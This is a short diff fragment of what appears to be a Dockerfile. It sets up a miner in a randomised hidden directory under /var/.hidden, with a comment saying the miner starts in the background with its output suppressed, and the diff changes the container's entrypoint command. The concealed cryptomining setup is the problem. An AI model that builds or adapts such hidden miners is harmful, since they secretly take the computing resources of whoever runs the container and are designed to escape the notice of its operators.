@@ -27,4 +27,4 @@ RUN chmod +x /var/.hidden/$RANDOM_DIR/entrypoint
 WORKDIR "/var/.hidden/$RANDOM_DIR"
 
 # Start miner in background with suppressed output
-ENTRYPOINT ["sh", "-c", "./entrypoint > /dev/null 2>&1 &"]
+ENTRYPOINT "./entrypoint"
